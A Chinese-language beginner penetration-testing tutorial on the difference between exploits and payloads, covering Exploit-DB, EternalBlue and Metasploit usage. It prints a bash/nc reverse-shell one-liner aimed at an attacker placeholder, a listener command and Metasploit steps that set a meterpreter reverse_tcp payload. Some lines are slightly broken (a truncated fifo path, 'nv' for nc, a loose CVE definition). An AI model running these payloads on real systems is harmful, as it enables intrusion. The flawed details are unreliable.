# 漏洞利用和有效载荷

> 在本文中，我将介绍漏洞利用和有效载荷的基础知识，以及两者的区别。在每次渗透测试中，你大概率都会需要漏洞利用并使用有效载荷。

## 漏洞利用和有效载荷简介

一些初学者对漏洞利用和有效载荷的区别感到困惑。事实上，它们在漏洞利用过程中具有两个截然不同的功能。如果没有漏洞利用，就无法传递有效载荷，如果没有有效载荷，就无法获得shell。

## 漏洞利用

漏洞利用是一段旨在利用计算机系统中漏洞的代码。由于这个定义涵盖了各种类型的系统，因此每种漏洞利用看起来都不一样。这些漏洞通常存在于现实世界的系统中，因为IT管理员经常忘记或缺乏资源来保持系统完全更新。也可能存在尚未发现的漏洞！

### 漏洞利用的类型

漏洞利用有很多种类型，例如：

- 缓冲区溢出漏洞

- SQL注入漏洞

- 跨站脚本（XSS）漏洞

- 跨站请求伪造（CSRF）漏洞

- 权限提升漏洞

- 拒绝服务（Dos）漏洞

- 钓鱼漏洞

- 0 Day漏洞

- 文件包含漏洞

- 恶意软件和木马漏洞

再次强调，目前细节并不重要，重要的是记住漏洞利用是滥用漏洞的，而漏洞可以有很多种。

### CVE

最后需要介绍的一个名词时CVE的定义。CVE（Common Vulnerabilities and Exposures，通用漏洞与暴露）是指利用已知漏洞的特定攻击或代码实例，并被分配了一个CVE标识符。

这个CVE由中央机构（如 MITRE）在研究人员或其他参与者识别出漏洞后分配。一旦漏洞被发现并存在漏洞利用可能，负责的供应商或组织通常会开发并发布修复漏洞的补丁或安全更新。

一旦我们开始寻找漏洞利用，我们经常会遇到这些CVE。

### 寻找漏洞利用点

通常，我们可以通过以下方法来寻找漏洞利用点：

#### 1. 扫描目标网络：

使用诸如nmap类似工具扫描目标网络，获取其主机和服务的详细信息，包括版本号。

#### 2. 搜索漏洞利用：

通过，以下几种方式查找与扫描结果匹配的漏洞利用：

- **谷歌搜索：** 使用一些关键词进行搜索，例如目标系统和服务版本号+漏洞利用（exploit）。

- **Metasploit：** 使用`search`命令在Metasploit框架内搜索漏洞利用模块。

- **Exploit-DB网站：** [https://www.exploit-db.com](https://www.exploit-db.com) 该网站提供大量漏洞利用的详细信息，其中大部分都包含对应的CVE编号。

#### 3. 漏洞利用脚本

找到漏洞利用点后，你可以选择自己编写脚本利用漏洞，也可以从Exploit-DB等网站获取现成的脚本。

一个著名的漏洞利用案例是EternalBlue，它利用了SMB服务器中的漏洞：[https://www.exploit-db.com/exploits/42315](https://www.exploit-db.com/exploits/42315) 。这些漏洞利用脚本通常使用Python等语言编写，在使用前可能需要修改脚本中的端口号或IP地址。幸运的是，这些漏洞利用脚本通常都附有详细的文档说明。

另外，除了使用独立的漏洞利用脚本外，你还可以使用Metasploit框架来运行漏洞利用并植入有效载荷到目标系统。稍后我会介绍Metasploit的具体用法，现在让我们了解以下什么是有效载荷。

## 有效载荷

虽然漏洞利用是利用系统中的漏洞，但有效载荷是在成功利用系统后发送的一段代码。一个基本的有效载荷示例是建立一个反向shell到目标系统的代码。简单来说，它可能看起来像这样：

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <Attacker ip> <Attacker listener port> > /tmp/
```

这要求你在你的系统上运行一个监听器。一个基本的监听器可以通过运行以下命令建立：

```bash
nv -lvnp <port>
```

一旦有效载荷被触发，你将获得一个反向shell。

重要的是要理解，我们用来获取系统shell的有效载荷很大程度上取决于目标系统上的操作系统、shell解释器语言，甚至编程语言。

虽然有些有效载荷是一行代码并手动部署，如上所示，但有些是使用自动化攻击框架生成的，例如Metasploit。

### Metasploit 自动生成有效载荷

本文不会深入讨论Metasploit的所有细节，但对于初学者来说，它绝对是最简单地使用漏洞利用和有效载荷的方法。一般步骤如下：

你可以通过`search` 命令来搜索漏洞利用，例如：

```bash
search ms17-010
```

![](https://github.com/owl234/Awesome-SRC-experience/blob/main/img/0_uxAtWpmh7aTi3gF7.webp)

然后，使用`use <exploit id>` 选择漏洞利用。然后设置列出选项（`show option`）时所需的选项。

常用的参数有：

- **RHOSTS：** “远程主机”，目标系统的IP地址。可以设置单个IP地址或网络范围。你还可以使用一个文件，其中列出了目标，每个目标一行，使用`file:/path/of/the/target_file.txt` 。

- **RPORT：** “远程端口”，目标系统上运行漏洞应用程序的端口。

- **LHOST：** “本地主机”，攻击机器（你的攻击盒子或Kali Linux）的IP地址。

- LPORT：“本地端口”，你将用于反向shell连接回的端口。这是攻击机器上的一个端口。

你可以通过运行`set <参数名称> <值>` 来设置这些参数。

![](https://github.com/owl234/Awesome-SRC-experience/blob/main/img/0_PI4oKf2qg8i_NmQf.webp)

一旦你设置了漏洞利用选项，就可以选择要使用的有效载荷。Metasploit中有两种不同类型的有效载荷：

- **Singles：** 自包含的有效载荷（添加用户、启动notepad.exe等）,不需要下载额外的组件即可运行。

- **Staged：** 分阶段的有效载荷首先在目标系统上上传一个启动器，然后下载其余的有效载荷（阶段）。这提供了一些优势，因为有效载荷的初始大小相对较小，使得有效载荷不太可能被发现。

使用`show payloads` 命令列出所选漏洞的利用模块可用的有效载荷。你可能想知道有效载荷是分阶段的还是单一的。如果我们查看：`windows/shell/reverse_tcp` 和 `windows/shell_reverse_tcp`，带有正斜杠的是“分阶段”有效载荷，带下划线的是“单一”有效载荷。

一旦你找了喜欢的有效载荷，可以使用`set payload` 命令，后跟要使用的有效载荷名称。

```bash
set payload windows/meterpreter/reverse_tcp
```

当你完成所有设置后，就可以运行了。

![](https://github.com/owl234/Awesome-SRC-experience/blob/main/img/0_JrGXTONNWSaip72w.webp)

一旦成功利用漏洞，就会创建一个会话。这是目标系统和Metasploit之间建立的通信通道。现在你可以提升你的权限了。

还有一点需要注意，你也可以使用Metasploit框架中的MSFvenom创建自己的有效载荷。如果我们没有与目标的直接网络连接，并且需要通过电子邮件等方式传递有效载荷，MSfvenom是一个很好的选择。MSfvenom只创建有效载荷文件，而不提供像Metasploit这样的其他漏洞利用自动化选项。

## 总结

在本文中，我们介绍了漏洞利用和有效载荷的含义。

1. **漏洞利用：** 
- 漏洞利用是一段代码或一种技术，利用计算机系统或软件应用程序中的漏洞或者弱点。

- 其主要的目的是获得未经授权的访问、控制或破坏目标系统。
2. **有效载荷：** 
- 相反，有载荷是在成功利用漏洞后攻击者传递给受损系统的恶意代码或操作。

- 有效载荷的目的可以多种多样，从窃取数据到创建后门以进行未来的访问，甚至造成系统的损坏。
3. **Metasploit：**
- Metasploit 是一个用来自动化运行漏洞利用和有效载荷并获取系统访问权限的框架。

- 虽然，Metasploit对初学者来说很棒，但是不要过于依赖它，因为学习如何在没有这个强大框架的情况下了解一切工作原理是一个更好的选择。
